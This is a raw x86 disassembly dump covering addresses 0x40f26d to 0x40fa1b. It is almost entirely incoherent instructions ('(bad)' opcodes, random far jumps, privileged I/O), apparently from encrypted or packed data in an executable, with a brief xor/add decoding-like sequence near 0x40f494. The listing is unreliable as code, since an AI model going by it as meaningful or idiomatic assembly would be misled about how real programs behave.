  40f26d:	push   0x6c
  40f26f:	xor    bl,BYTE PTR [ebp-0xb814839]
  40f275:	aas    
  40f276:	clc    
  40f277:	call   0x882d:0x8458d5eb
  40f27e:	fisub  WORD PTR [esi-0x24448368]
  40f284:	add    bl,ch
  40f286:	inc    esi
  40f287:	inc    edx
  40f288:	callw  0xd8aa
  40f28c:	lock adc eax,0x9ad18291
  40f292:	jns    0x40f2cf
  40f294:	lds    edi,FWORD PTR [ebp+0x31]
  40f297:	cmp    DWORD PTR [ecx+0x18969e2a],edi
  40f29d:	dec    edi
  40f29e:	sub    ebp,DWORD PTR [edi+0x3f]
  40f2a1:	jl     0x40f261
  40f2a3:	mov    bl,0x5a
  40f2a5:	jns    0x40f2de
  40f2a7:	xchg   WORD PTR [esi+0x4f95d288],si
  40f2ae:	and    DWORD PTR [edx+0x65ddd282],esi
  40f2b4:	pop    eax
  40f2b5:	lock ss call 0xe3a28859
  40f2bc:	icebp  
  40f2bd:	dec    esp
  40f2be:	popf   
  40f2bf:	jmp    0x1414:0xd3c8a2c7
  40f2c6:	pop    edi
  40f2c7:	test   al,0x84
  40f2c9:	stos   BYTE PTR es:[edi],al
  40f2ca:	pop    esi
  40f2cb:	hlt    
  40f2cc:	mov    esp,0xcddd8663
  40f2d1:	test   BYTE PTR [esi],al
  40f2d3:	and    bh,BYTE PTR [ebx-0x35]
  40f2d6:	out    0x44,al
  40f2d8:	cmp    al,0x1a
  40f2da:	pop    edi
  40f2db:	xchg   esp,eax
  40f2dc:	lods   eax,DWORD PTR ds:[esi]
  40f2dd:	pop    ss
  40f2de:	push   esi
  40f2df:	rcr    bl,0xe4
  40f2e2:	leave  
  40f2e3:	push   edx
  40f2e4:	adc    dh,BYTE PTR [edx+0x41]
  40f2e7:	xchg   DWORD PTR [ebx+0x4a],ecx
  40f2ea:	aas    
  40f2eb:	adc    DWORD PTR [eax],eax
  40f2ed:	xchg   edx,eax
  40f2ee:	mov    esp,0xa25677e6
  40f2f3:	jmp    0x40f2f2
  40f2f5:	adc    ah,BYTE PTR [edi+0x1c19dcb8]
  40f2fb:	jno    0x40f2f1
  40f2fd:	int    0xe5
  40f2ff:	arpl   bx,si
  40f301:	aam    0xe1
  40f303:	lahf   
  40f304:	pushf  
  40f305:	bound  ecx,QWORD PTR [edx+0x61]
  40f308:	add    ch,BYTE PTR [edx-0x55efcec1]
  40f30e:	stos   BYTE PTR es:[edi],al
  40f30f:	aad    0x43
  40f311:	(bad)  [ebx-0x73ebc72f]
  40f317:	sbb    BYTE PTR [eax],bl
  40f319:	sbb    eax,0xb55dd6f9
  40f31e:	adc    ebx,DWORD PTR ds:0x577b3a28
  40f324:	jmp    0xb14b:0x3511af5
  40f32b:	or     al,0xf0
  40f32d:	jns    0x40f34b
  40f32f:	jmp    0x40f30e
  40f331:	pop    edx
  40f332:	mov    eax,ebp
  40f334:	pop    esp
  40f335:	adc    al,0x37
  40f337:	daa    
  40f338:	outs   dx,DWORD PTR ds:[esi]
  40f339:	push   edi
  40f33a:	call   0xd1e59ab7
  40f33f:	outs   dx,DWORD PTR ds:[esi]
  40f340:	add    DWORD PTR [ecx+0x5b027721],ebp
  40f346:	into   
  40f347:	inc    esp
  40f348:	jae    0x40f2db
  40f34a:	mov    eax,DWORD PTR [ebp-0x6dd0a90a]
  40f350:	xor    DWORD PTR [eax],ebx
  40f352:	stc    
  40f353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f354:	mov    WORD PTR ds:[ecx-0x69],ds
  40f358:	mov    al,ds:0x344a7194
  40f35d:	nop
  40f35e:	sbb    BYTE PTR [edi+eax*8],cl
  40f361:	inc    ebp
  40f362:	gs xchg ebp,eax
  40f364:	sbb    al,0x7a
  40f366:	movups xmm4,xmm1
  40f369:	and    ebx,DWORD PTR [eax-0x46ffb486]
  40f36f:	xor    BYTE PTR [ebx],dl
  40f371:	sub    ch,ah
  40f373:	adc    eax,ecx
  40f375:	jns    0x40f30b
  40f377:	pushf  
  40f378:	fs inc esi
  40f37a:	aas    
  40f37b:	ror    DWORD PTR [ecx-0x712239d5],1
  40f381:	add    BYTE PTR [edx],ch
  40f383:	nop
  40f384:	sbb    dl,BYTE PTR [edi+0x659a8dc]
  40f38a:	xchg   edi,eax
  40f38b:	dec    ebp
  40f38c:	sbb    eax,0xe275b6c3
  40f391:	fisub  WORD PTR [edx+0x40215542]
  40f397:	add    eax,0xd45f6e97
  40f39c:	xor    DWORD PTR [eax],esi
  40f39e:	mov    dl,BYTE PTR [eax-0x624db818]
  40f3a4:	in     eax,0xeb
  40f3a6:	into   
  40f3a7:	(bad)  
  40f3a8:	das    
  40f3a9:	jp     0x40f354
  40f3ab:	dec    ebp
  40f3ac:	push   ss
  40f3ad:	xlat   BYTE PTR ds:[ebx]
  40f3ae:	jb     0x40f358
  40f3b0:	arpl   bp,cx
  40f3b2:	jle    0x40f410
  40f3b4:	sbb    al,bh
  40f3b6:	ror    al,cl
  40f3b8:	cmp    al,0x8e
  40f3ba:	jg     0x1d50d2ce
  40f3c0:	inc    ebx
  40f3c1:	mov    eax,ds:0xbba114c8
  40f3c6:	outs   dx,BYTE PTR ds:[esi]
  40f3c7:	sahf   
  40f3c8:	push   esi
  40f3c9:	repz sbb al,0x99
  40f3cc:	jno    0x40f40f
  40f3ce:	loopne 0x40f3e2
  40f3d0:	add    ebx,ecx
  40f3d2:	and    al,0x37
  40f3d4:	dec    ebp
  40f3d5:	dec    edi
  40f3d6:	sar    BYTE PTR [edi],cl
  40f3d8:	adc    al,0xb5
  40f3da:	dec    ecx
  40f3db:	mov    al,ds:0x13c2d8d6
  40f3e0:	test   esp,edx
  40f3e2:	repz aaa 
  40f3e4:	fs cmc 
  40f3e6:	push   ebx
  40f3e7:	enter  0xa717,0xc9
  40f3eb:	faddp  st(1),st
  40f3ed:	and    eax,DWORD PTR [bx+si-0x53]
  40f3f1:	mov    dh,0xdf
  40f3f3:	dec    esp
  40f3f4:	or     ebx,DWORD PTR [esi-0x773638fb]
  40f3fa:	add    esi,DWORD PTR [edi]
  40f3fc:	iret   
  40f3fd:	pop    es
  40f3fe:	jge    0x40f43f
  40f400:	mov    esp,0x57ea75d9
  40f405:	add    BYTE PTR [ecx-0x43],dl
  40f408:	mov    ah,0x28
  40f40a:	test   eax,0x828664d7
  40f40f:	mov    bl,0x58
  40f411:	inc    BYTE PTR [ebx-0x734c963f]
  40f417:	sbb    eax,0xb39e5663
  40f41c:	pop    edi
  40f41d:	rcr    BYTE PTR [ebx-0x591cf873],0xd4
  40f424:	jmp    0x58f5:0x4a29a6b2
  40f42b:	mov    bl,0xd7
  40f42d:	loop   0x40f4a5
  40f42f:	jge    0x40f44a
  40f431:	jle    0x40f485
  40f433:	jb     0x40f3cd
  40f435:	jle    0x40f3bb
  40f437:	mov    esi,0xcf70c499
  40f43c:	sub    BYTE PTR [ecx-0x1fb81c0c],cl
  40f442:	pop    ss
  40f443:	adc    esp,edx
  40f445:	inc    eax
  40f446:	bound  esi,QWORD PTR [edx]
  40f448:	cmp    DWORD PTR [ebp+0x69],ebp
  40f44b:	xor    DWORD PTR [ecx-0x31],ebx
  40f44e:	xchg   esp,eax
  40f44f:	fisttp WORD PTR [edx+0x27]
  40f452:	push   ecx
  40f453:	or     DWORD PTR [ebp-0x3111149a],edi
  40f459:	or     esp,DWORD PTR [ecx]
  40f45b:	imul   ebp,DWORD PTR [ecx-0x5e73ffc7],0x64
  40f462:	mov    al,0x1d
  40f464:	stc    
  40f465:	or     al,0x89
  40f467:	mov    eax,ds:0xb79340f5
  40f46c:	adc    DWORD PTR [ebx+0x48],edx
  40f46f:	hlt    
  40f470:	ins    DWORD PTR es:[edi],dx
  40f471:	std    
  40f472:	or     edi,edi
  40f474:	jne    0x40f46d
  40f476:	add    edx,DWORD PTR [ecx]
  40f478:	sub    ecx,eax
  40f47a:	hlt    
  40f47b:	daa    
  40f47c:	stos   BYTE PTR es:[edi],al
  40f47d:	pop    esi
  40f47e:	push   ss
  40f47f:	bswap  edi
  40f481:	add    BYTE PTR [eax],0xd6
  40f484:	adc    BYTE PTR [edi],0xbf
  40f487:	xor    dl,ch
  40f489:	mov    ebp,0x716a0e8
  40f48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f48f:	das    
  40f490:	push   0x27
  40f492:	loope  0x40f414
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421ca2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ca2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	add    BYTE PTR [esi+esi*2],dh
  40f4c7:	or     BYTE PTR [ebx-0x73],0x62
  40f4cb:	(bad)  
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x2]
  40f4d1:	cs adc bl,dl
  40f4d4:	and    al,0x47
  40f4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4d7:	pusha  
  40f4d8:	iret   
  40f4d9:	xchg   ecx,eax
  40f4da:	mov    esp,0xfdf3b108
  40f4df:	call   0xbeb5:0xdc2d828f
  40f4e6:	sbb    DWORD PTR ds:0xe5b4e103,0x5173eba
  40f4f0:	sub    al,0xce
  40f4f2:	cmp    eax,0x62a0fc26
  40f4f7:	cmp    eax,0xfdffe698
  40f4fc:	retf   0xd4b
  40f4ff:	cwde   
  40f500:	adc    eax,0xa80a0a13
  40f505:	push   esi
  40f506:	addr16 xor al,0xa3
  40f509:	in     eax,dx
  40f50a:	fdivr  QWORD PTR [edi+eiz*1-0x7a54a9d8]
  40f511:	ins    BYTE PTR es:[edi],dx
  40f512:	adc    cl,BYTE PTR [edi-0x73]
  40f515:	in     al,dx
  40f516:	jle    0x40f49d
  40f518:	inc    esi
  40f519:	xor    BYTE PTR [ebx+0x6f],bl
  40f51c:	mov    es,WORD PTR [ebp+0x762c130e]
  40f522:	iret   
  40f523:	out    0xad,al
  40f525:	aad    0xdd
  40f527:	stc    
  40f528:	dec    ecx
  40f529:	int3   
  40f52a:	push   ebx
  40f52b:	jge    0x40f59b
  40f52d:	cmp    eax,0x6d095f81
  40f532:	xchg   edx,eax
  40f533:	(bad)  [eax+0x377342b0]
  40f539:	pop    ecx
  40f53a:	lods   al,BYTE PTR ds:[esi]
  40f53b:	pop    ebp
  40f53c:	push   edx
  40f53d:	pop    eax
  40f53e:	stos   BYTE PTR es:[edi],al
  40f53f:	stc    
  40f540:	xchg   edi,esi
  40f542:	add    al,0x88
  40f544:	loopne 0x40f546
  40f546:	pmullw mm4,mm5
  40f549:	adc    edi,DWORD PTR [ebp-0x631903be]
  40f54f:	loope  0x40f51b
  40f551:	popa   
  40f552:	bound  edi,QWORD PTR [ebx]
  40f554:	mov    ebp,0xe7b04215
  40f559:	jnp    0x40f5ad
  40f55b:	or     bl,BYTE PTR [eax-0x23]
  40f55e:	adc    al,0x73
  40f560:	jge    0x40f4ff
  40f562:	int    0xd5
  40f564:	cdq    
  40f565:	sti    
  40f566:	pop    ebx
  40f567:	loop   0x40f561
  40f569:	ss dec eax
  40f56b:	call   0xaa3dc948
  40f570:	in     eax,0xe1
  40f572:	aaa    
  40f573:	cld    
  40f574:	jno    0x40f5e5
  40f576:	ret    
  40f577:	xor    DWORD PTR [edi],0xffffffc8
  40f57a:	inc    eax
  40f57b:	(bad)
  40f57f:	aas    
  40f580:	push   edx
  40f581:	ror    edx,0xb3
  40f584:	mov    WORD PTR [ebx+0x9],fs
  40f587:	jg     0x40f5d4
  40f589:	jbe    0x40f556
  40f58b:	pushf  
  40f58c:	es jl  0x40f5e0
  40f58f:	dec    ebx
  40f590:	sub    ecx,esp
  40f592:	xchg   BYTE PTR [esi+0x2616c584],bh
  40f598:	push   esi
  40f599:	adc    dl,al
  40f59b:	jae    0x40f5c7
  40f59d:	mov    BYTE PTR [eax],bl
  40f59f:	cmp    DWORD PTR [ebx+0x1b],0x57
  40f5a3:	stos   DWORD PTR es:[edi],eax
  40f5a4:	jle    0x40f56f
  40f5a6:	push   eax
  40f5a7:	hlt    
  40f5a8:	call   0x5971595d
  40f5ad:	adc    al,0x44
  40f5af:	lods   eax,DWORD PTR ds:[esi]
  40f5b0:	das    
  40f5b1:	jno    0x40f5df
  40f5b3:	mov    al,ds:0x1b5564b1
  40f5b8:	xor    BYTE PTR [eax+esi*4],0xec
  40f5bc:	loope  0x40f613
  40f5be:	or     DWORD PTR [edx-0x4],eax
  40f5c1:	mov    dl,0x67
  40f5c3:	xchg   ebp,eax
  40f5c4:	icebp  
  40f5c5:	neg    edx
  40f5c7:	nop
  40f5c8:	push   ebx
  40f5c9:	fwait
  40f5ca:	cmp    BYTE PTR [ebp+0x41],dl
  40f5cd:	loopne 0x40f61d
  40f5cf:	adc    esi,DWORD PTR [edi+0x60]
  40f5d2:	inc    ebp
  40f5d3:	jbe    0x40f604
  40f5d5:	or     esp,DWORD PTR [esi+0x1a]
  40f5d8:	sbb    edx,esi
  40f5da:	xchg   DWORD PTR [edi],edi
  40f5dc:	pop    esi
  40f5dd:	mov    esi,0xf72fa10d
  40f5e2:	das    
  40f5e3:	repnz cs push esp
  40f5e6:	push   es
  40f5e7:	ds adc eax,0xf9bd2593
  40f5ed:	and    BYTE PTR ds:0x3d4a404b,al
  40f5f3:	dec    edx
  40f5f4:	adc    BYTE PTR [edi+0x6f],bh
  40f5f7:	jp     0x40f5d4
  40f5f9:	data16 sub ch,BYTE PTR [edx]
  40f5fc:	adc    eax,0xc6dc04
  40f601:	jp     0x40f5a7
  40f603:	xchg   edi,eax
  40f604:	ss push ecx
  40f606:	cmp    edi,DWORD PTR [edx]
  40f608:	pusha  
  40f609:	adc    DWORD PTR [eax+0x7f],ecx
  40f60c:	mov    BYTE PTR [ecx],bl
  40f60e:	add    bl,BYTE PTR [eax+ebp*8-0x6a]
  40f612:	leave  
  40f613:	pop    ebp
  40f614:	jle    0x40f615
  40f616:	dec    esi
  40f617:	push   es
  40f618:	xchg   esp,eax
  40f619:	add    ecx,DWORD PTR [eax+0x3]
  40f61c:	xor    DWORD PTR [eax-0x68],eax
  40f61f:	out    0x31,al
  40f621:	lds    ecx,FWORD PTR [eax+0x6bb6e1dc]
  40f627:	pop    edx
  40f628:	add    ebx,DWORD PTR [esi]
  40f62a:	stc    
  40f62b:	cmp    edx,DWORD PTR [eax]
  40f62d:	out    dx,al
  40f62e:	nop
  40f62f:	inc    ecx
  40f630:	sub    eax,0xa721bb6
  40f635:	xchg   ebp,eax
  40f636:	cmp    BYTE PTR [edx-0x8801704],0x1d
  40f63d:	mov    bl,0xe5
  40f63f:	jecxz  0x40f5d6
  40f641:	or     al,0xaa
  40f643:	call   0x8cc39363
  40f648:	fdivr  QWORD PTR [ecx+0x594ea850]
  40f64e:	lea    eax,[esi+0x58]
  40f651:	or     eax,0xb66cf87e
  40f656:	and    eax,0x3fc34216
  40f65b:	adc    BYTE PTR [ebx],0x1f
  40f65e:	cld    
  40f65f:	out    0xec,eax
  40f661:	(bad)  
  40f662:	shl    BYTE PTR [ebx+edi*4+0x6f],1
  40f666:	ror    BYTE PTR gs:[edx+0x7f],cl
  40f66a:	mov    eax,0xf8a70e09
  40f66f:	or     al,0xa2
  40f671:	mov    esi,0x418bbd69
  40f676:	mov    DWORD PTR [ebp+0x3c],ecx
  40f679:	mov    ah,0xcd
  40f67b:	mov    ss,WORD PTR [ecx+0x20]
  40f67e:	shl    BYTE PTR [edi],0xe7
  40f681:	jnp    0x40f655
  40f683:	in     eax,0x56
  40f685:	jns    0x40f623
  40f687:	mov    esp,0x66cd12d
  40f68c:	aam    0xff
  40f68e:	stos   BYTE PTR es:[edi],al
  40f68f:	mov    bl,0x4c
  40f691:	add    al,0xc2
  40f694:	inc    ecx
  40f695:	push   es
  40f696:	fisubr WORD PTR [edi+0x11]
  40f699:	mov    ebx,0xb769dbbb
  40f69e:	sub    esp,DWORD PTR [eax-0x19]
  40f6a1:	fstp   QWORD PTR [ebx]
  40f6a3:	push   ds
  40f6a4:	dec    ebx
  40f6a5:	test   BYTE PTR [ebx],bh
  40f6a7:	jo     0x40f704
  40f6a9:	iret   
  40f6aa:	lods   al,BYTE PTR ds:[esi]
  40f6ab:	cmp    ch,bh
  40f6ad:	std    
  40f6ae:	xchg   edi,eax
  40f6af:	icebp  
  40f6b0:	aaa    
  40f6b1:	and    ebx,ecx
  40f6b3:	fisub  DWORD PTR [eax-0x1c]
  40f6b6:	mov    bh,0x18
  40f6b8:	push   esp
  40f6b9:	xlat   BYTE PTR ds:[ebx]
  40f6ba:	cmp    eax,0x50332ac4
  40f6bf:	sbb    DWORD PTR [edx],eax
  40f6c1:	sbb    eax,0x5250ca7
  40f6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6c7:	sbb    BYTE PTR [eax-0x78779dea],al
  40f6cd:	dec    edi
  40f6ce:	push   edx
  40f6cf:	popa   
  40f6d0:	popa   
  40f6d1:	imul   esp,DWORD PTR [ebp*4-0x45a4fad9],0xa63586d6
  40f6dc:	mov    ds:0xc43d1683,eax
  40f6e1:	in     al,dx
  40f6e2:	mov    al,0xa1
  40f6e4:	retf   
  40f6e5:	(bad)  [edi+eax*4+0x49]
  40f6e9:	inc    ebp
  40f6ea:	jb     0x40f741
  40f6ec:	mov    dl,0x8b
  40f6ee:	jnp    0x40f6d3
  40f6f0:	cwde   
  40f6f1:	mov    dl,0x7a
  40f6f3:	xor    al,0x80
  40f6f5:	dec    esp
  40f6f6:	outs   dx,DWORD PTR ds:[esi]
  40f6f7:	nop
  40f6f8:	sti    
  40f6f9:	mov    edi,0x403c3bbd
  40f6fe:	add    BYTE PTR [ebp+0x34fae3a8],bl
  40f704:	mov    esi,0xbaa18d78
  40f709:	icebp  
  40f70a:	nop
  40f70b:	mov    edi,0x7c99f067
  40f710:	cmp    eax,0x18ee97d
  40f715:	sub    DWORD PTR [edx-0x28916fd1],0xffffffc1
  40f71c:	xlat   BYTE PTR ds:[ebx]
  40f71d:	in     al,dx
  40f71e:	push   esp
  40f71f:	int3   
  40f720:	jge    0x40f74d
  40f722:	fadd   QWORD PTR [ebx]
  40f724:	add    ebx,DWORD PTR [ecx+0x52b75e36]
  40f72a:	sub    eax,0xa3b3fbdd
  40f72f:	test   eax,0x313a466a
  40f734:	arpl   WORD PTR [eax-0x9],bx
  40f737:	arpl   WORD PTR [ebx-0x4a],dx
  40f73a:	arpl   WORD PTR [ecx-0x1fa7eb66],bp
  40f740:	das    
  40f741:	test   DWORD PTR [edx-0x7e24697b],edx
  40f747:	rcl    DWORD PTR [edi+esi*8],1
  40f74a:	sar    ebx,0x94
  40f74d:	pop    edx
  40f74e:	je     0x40f715
  40f750:	push   edx
  40f751:	mov    esi,0x1055ef6f
  40f756:	jo     0x40f74e
  40f758:	rol    DWORD PTR [esi+0x6a],0x1d
  40f75c:	das    
  40f75d:	jmp    0x40f6e0
  40f75f:	sub    al,0xf3
  40f762:	into   
  40f763:	sahf   
  40f764:	sbb    eax,0xf29aa4fb
  40f769:	add    BYTE PTR [eax+edi*2+0x1520173],dl
  40f770:	jno    0x40f6f6
  40f772:	cmp    dh,ch
  40f774:	pusha  
  40f775:	mov    ebx,0xe79426ec
  40f77a:	xor    ebp,ecx
  40f77c:	ds pop ecx
  40f77e:	sbb    eax,DWORD PTR [esi+0x2]
  40f781:	popa   
  40f782:	fidivr DWORD PTR [ecx-0x29aa6a65]
  40f788:	fwait
  40f789:	dec    edx
  40f78a:	nop    DWORD PTR [ecx]
  40f78d:	scas   al,BYTE PTR es:[edi]
  40f78e:	repz push es
  40f790:	retf   0xb8d4
  40f793:	sub    BYTE PTR [esi],0x25
  40f796:	adc    eax,0x7c1ff3ba
  40f79b:	shr    DWORD PTR [ecx+0x6c031ab6],0xfa
  40f7a2:	fild   DWORD PTR [edx-0x5e05e06e]
  40f7a8:	jno    0x40f7c7
  40f7aa:	call   0xfdc7:0x4db5dde4
  40f7b1:	bound  ebp,QWORD PTR [eax+0x9]
  40f7b4:	add    DWORD PTR ds:0x9695c2cc,ecx
  40f7ba:	jmp    0x40f74a
  40f7bc:	xor    dl,BYTE PTR [eax+0x6a]
  40f7bf:	cmp    esi,DWORD PTR [ecx]
  40f7c1:	mov    dl,0x1d
  40f7c3:	mov    ds:0x39ecda10,eax
  40f7c8:	pop    ds
  40f7c9:	adc    cl,ah
  40f7cb:	in     ax,0x7a
  40f7ce:	sbb    DWORD PTR [ebp+ecx*2-0x4f5679da],ebx
  40f7d5:	jge    0x40f80c
  40f7d7:	wbinvd 
  40f7d9:	inc    esp
  40f7da:	fs rdtsc 
  40f7dd:	lds    esi,FWORD PTR [ebx]
  40f7df:	or     esi,DWORD PTR [ecx+0x5c1c3755]
  40f7e5:	cmc    
  40f7e6:	mov    dl,0x15
  40f7e8:	jl     0x40f809
  40f7ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7eb:	loopne 0x40f7f6
  40f7ed:	dec    esi
  40f7ee:	or     eax,0x6e6d627b
  40f7f3:	sub    edx,edx
  40f7f5:	das    
  40f7f6:	push   0x52
  40f7f8:	iret   
  40f7f9:	cs push 0xfffffff6
  40f7fc:	push   esi
  40f7fd:	mov    al,ds:0xf6533f0b
  40f802:	in     eax,dx
  40f803:	test   BYTE PTR ds:0xc04cd332,dh
  40f809:	and    al,0xbb
  40f80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f80c:	ss jmp 0xf12c:0x84f710f5
  40f814:	pusha  
  40f815:	repz hlt 
  40f817:	cdq    
  40f818:	push   0xfcdb9a90
  40f81d:	xchg   esp,eax
  40f81e:	stc    
  40f81f:	rcr    BYTE PTR [edi-0x77],1
  40f822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f823:	jg     0x40f827
  40f825:	in     al,dx
  40f826:	dec    esi
  40f827:	add    esi,ebp
  40f829:	mov    esp,0xcdaec477
  40f82e:	mov    edi,0x147d7d01
  40f833:	fcmovb st,st(0)
  40f835:	push   ebp
  40f836:	mov    ds:0xcc63cf9a,eax
  40f83b:	add    eax,0xf5bc4ae4
  40f840:	inc    esi
  40f841:	mov    ch,0xa2
  40f843:	cdq    
  40f844:	fwait
  40f845:	mov    eax,ds:0x7dfc1ec
  40f84a:	sbb    BYTE PTR [eax+0x5d],cl
  40f84d:	(bad)  
  40f84e:	inc    esi
  40f84f:	push   esp
  40f850:	repnz mov ds:0x5591f324,al
  40f856:	dec    ebp
  40f857:	push   eax
  40f858:	popf   
  40f859:	in     eax,0xee
  40f85b:	xor    eax,0x6f5f0e5a
  40f860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f861:	mov    ebp,0xf582528b
  40f866:	mov    bh,0xf3
  40f868:	enter  0xd8a6,0x7
  40f86c:	push   edx
  40f86d:	ss xor eax,0x14395635
  40f873:	leave  
  40f874:	dec    edi
  40f875:	loop   0x40f88e
  40f877:	imul   eax,DWORD PTR [ebx+edx*4+0x5b6849d0],0x5a
  40f87f:	mov    ecx,0x6001ff8e
  40f884:	enter  0x8b7c,0x8d
  40f888:	in     eax,0x1f
  40f88a:	jo     0x40f8b4
  40f88c:	mov    bl,0xbf
  40f88e:	mov    esi,0x6aa3ca89
  40f893:	push   0xebcd5c1d
  40f898:	jne    0x40f84a
  40f89a:	mov    ds:0xf07bf784,eax
  40f89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a0:	(bad)  
  40f8a1:	push   ds
  40f8a2:	cmp    eax,0xe59305c6
  40f8a7:	and    DWORD PTR [esi+edi*8-0x79],eax
  40f8ab:	pop    esi
  40f8ac:	mov    ds:0x38485a67,eax
  40f8b1:	hlt    
  40f8b2:	in     al,dx
  40f8b3:	push   ds
  40f8b4:	cmp    BYTE PTR [edi-0x7c47c3c],al
  40f8ba:	out    0xa0,al
  40f8bc:	shr    DWORD PTR cs:[ebp-0x4b],0x8f
  40f8c1:	rol    DWORD PTR [edx-0x25],1
  40f8c4:	adc    esi,DWORD PTR [ebp+0x3d0ec14d]
  40f8ca:	lahf   
  40f8cb:	mov    cl,0x7
  40f8cd:	cmp    eax,ecx
  40f8cf:	cmp    DWORD PTR [esi-0x75],esp
  40f8d2:	pop    ecx
  40f8d3:	mov    dh,0x63
  40f8d5:	inc    edx
  40f8d6:	(bad)  
  40f8d7:	lods   al,BYTE PTR ds:[esi]
  40f8d8:	cmp    edx,DWORD PTR [ebx]
  40f8da:	int3   
  40f8db:	push   ebp
  40f8dc:	mov    edx,0x77ea85d4
  40f8e1:	popa   
  40f8e2:	pusha  
  40f8e3:	imul   esi,ecx,0x1d
  40f8e6:	mov    ch,0x4a
  40f8e8:	(bad)  
  40f8ea:	pop    es
  40f8eb:	push   es
  40f8ec:	mov    ds:0xff250e47,eax
  40f8f1:	and    eax,0x15b72aa
  40f8f6:	popa   
  40f8f7:	adc    esp,DWORD PTR [edi]
  40f8f9:	xchg   edi,eax
  40f8fa:	jmp    0xe2a0f480
  40f8ff:	mov    BYTE PTR [eax],dh
  40f901:	or     BYTE PTR [edx],dh
  40f903:	xor    DWORD PTR [eax+0x4e],eax
  40f906:	mov    bh,0x54
  40f908:	sahf   
  40f909:	scas   eax,DWORD PTR es:[edi]
  40f90a:	xchg   esi,eax
  40f90b:	mov    ?,WORD PTR [edi+0x10]
  40f90e:	in     eax,0xf1
  40f910:	in     eax,dx
  40f911:	or     ebp,DWORD PTR [ebx+edi*8+0x4f72e878]
  40f918:	sub    eax,0x3b345441
  40f91d:	sub    BYTE PTR [bp+si+0x167c],bh
  40f922:	int    0x99
  40f924:	pop    esi
  40f925:	pop    edx
  40f926:	lahf   
  40f927:	fsub   DWORD PTR [edx-0x3d9e18cf]
  40f92d:	mov    al,0xf0
  40f92f:	and    dh,BYTE PTR [eax+0x7b]
  40f932:	pop    es
  40f933:	scas   eax,DWORD PTR es:[edi]
  40f934:	pop    ss
  40f935:	popf   
  40f936:	mov    ah,0xa0
  40f938:	call   0x3832:0xffa2e9fb
  40f93f:	ficom  WORD PTR [esi-0x30]
  40f942:	mov    ss,WORD PTR [edi-0x3f]
  40f945:	inc    ebp
  40f946:	enter  0x5358,0x24
  40f94a:	dec    esp
  40f94b:	(bad)  
  40f94c:	xor    DWORD PTR [edx-0x40],edx
  40f94f:	xor    BYTE PTR [edx],bh
  40f951:	sbb    ebp,ecx
  40f953:	test   BYTE PTR [edi+0x41],ch
  40f956:	mov    ecx,0x9f4aef29
  40f95b:	sub    al,0x4b
  40f95d:	add    eax,0x1e015624
  40f962:	(bad)  
  40f964:	(bad)  
  40f965:	sti    
  40f966:	dec    edx
  40f967:	mov    dh,BYTE PTR [edi-0xc]
  40f96a:	sbb    al,0x51
  40f96c:	or     DWORD PTR [ebp+0x69],edi
  40f96f:	xor    al,0x1b
  40f971:	push   cs
  40f972:	stos   BYTE PTR es:[edi],al
  40f973:	or     BYTE PTR [eax+0x12ce68c6],al
  40f979:	xchg   ecx,eax
  40f97a:	fisttp QWORD PTR [ebx]
  40f97c:	pushf  
  40f97d:	mov    ch,0x5a
  40f97f:	pop    eax
  40f980:	push   edx
  40f981:	repz lds edx,FWORD PTR [edx-0x4d]
  40f985:	ror    ebx,cl
  40f987:	jl     0x40f928
  40f989:	and    BYTE PTR [edx-0x5],bh
  40f98c:	mov    ch,BYTE PTR [esi]
  40f98e:	loopne 0x40f9f0
  40f990:	test   BYTE PTR [ebx+ecx*4+0x24],ch
  40f994:	rol    esp,0xac
  40f997:	das    
  40f998:	jns    0x40f967
  40f99a:	xor    al,0xb5
  40f99c:	mov    eax,0xf5288a03
  40f9a1:	shr    ecx,1
  40f9a3:	(bad)  
  40f9a4:	xchg   esi,eax
  40f9a5:	adc    DWORD PTR [edx-0x4e21ac24],edi
  40f9ab:	dec    ebp
  40f9ac:	xchg   ecx,eax
  40f9ad:	test   BYTE PTR [ecx-0x2c766d2f],0x93
  40f9b4:	mov    ebx,0x1c72c9da
  40f9b9:	sub    BYTE PTR cs:[ebp-0x6cb32a73],bl
  40f9c0:	rol    BYTE PTR ss:0x41229c48,0xe6
  40f9c8:	idiv   BYTE PTR [ecx-0x15122f4]
  40f9ce:	ret    
  40f9cf:	xor    eax,0xb923a15
  40f9d4:	push   esi
  40f9d5:	pop    edx
  40f9d6:	adc    cl,BYTE PTR [esp+esi*2-0xac2fb86]
  40f9dd:	push   es
  40f9de:	test   eax,0x16cff043
  40f9e3:	sbb    eax,0x330cfad5
  40f9e8:	dec    esi
  40f9e9:	cmp    BYTE PTR [ebx+0xd],0xc8
  40f9ed:	jmp    DWORD PTR [edx]
  40f9ef:	mov    es,edi
  40f9f1:	mov    gs,WORD PTR [ebx]
  40f9f3:	retf   
  40f9f4:	popf   
  40f9f5:	add    ebx,DWORD PTR [esi+0xc33dabf]
  40f9fb:	and    dl,BYTE PTR [esi-0x3a5b58df]
  40fa01:	cs dec edi
  40fa03:	popa   
  40fa04:	sub    eax,0x9bc2eb5f
  40fa09:	mov    edi,0x6c294896
  40fa0e:	and    BYTE PTR [ecx],bl
  40fa10:	add    esp,DWORD PTR cs:[ecx+edi*1]
  40fa14:	sub    eax,0x93ed50af
  40fa19:	fld    st(3)
  40fa1b:	pop    ebp
